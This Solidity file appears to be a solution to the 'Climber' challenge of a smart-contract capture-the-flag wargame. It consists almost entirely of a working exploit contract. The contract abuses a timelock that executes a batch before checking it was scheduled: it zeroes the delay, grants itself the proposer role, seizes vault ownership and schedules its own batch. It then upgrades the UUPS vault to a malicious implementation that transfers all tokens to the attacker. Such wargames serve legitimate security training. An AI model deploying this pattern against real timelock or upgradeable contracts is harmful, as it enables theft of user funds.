pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";


interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ITimeLock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function updateDelay(uint64 newDelay) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function grantRole(bytes32 role, address account) external;
}

interface IVault {

    function upgradeTo(address newImplementation) external;

    function transfer(address spender, address tokenAddress) external;

    function transferOwnership(address newOwner) external;

}

contract ClimberAttacker {

    IToken private dvt;
    ITimeLock private timeLock;
    IVault private vault;
    TokenTransfer private tokenTransfer;

    constructor(address tokenAddress, address timeLockAddress, address vaultAddress) {
        dvt = IToken(tokenAddress);
        vault = IVault(vaultAddress);
        timeLock = ITimeLock(timeLockAddress);
        tokenTransfer = new TokenTransfer();
    }

    function schedule() external payable{
        address[] memory targets = new address[](4);
        targets[0] = address(timeLock);
        targets[1] = address(timeLock);
        targets[2] = address(vault);
        targets[3] = address(this);
        uint256[]  memory values = new uint256[](4);
        for (uint256 i = 0; i < 4; i++) {
            values[i] = 0;
        }
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)",uint64(0));
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this));
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)",address(this));
        dataElements[3] = abi.encodeWithSignature("schedule()");
        timeLock.schedule(targets,values,dataElements,keccak256("SALT"));
    }

    function attack() external {

        address attacker = msg.sender;

        address[] memory targets = new address[](4);
        targets[0] = address(timeLock);
        targets[1] = address(timeLock);
        targets[2] = address(vault);
        targets[3] = address(this);
        uint256[]  memory values = new uint256[](4);
        for (uint256 i = 0; i < 4; i++) {
            values[i] = 0;
        }
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)",uint64(0));
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this));
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)",address(this));
        dataElements[3] = abi.encodeWithSignature("schedule()");

        timeLock.execute(targets,values,dataElements,keccak256("SALT"));

        vault.upgradeTo(address(tokenTransfer));
        vault.transfer(attacker,address(dvt));

    }

    receive() external payable {}
}


contract TokenTransfer is Initializable, OwnableUpgradeable, UUPSUpgradeable{

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    constructor() initializer {}

    function transfer(address spender, address tokenAddress) external {
        IToken(tokenAddress).transfer(spender, 10000000 ether);
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}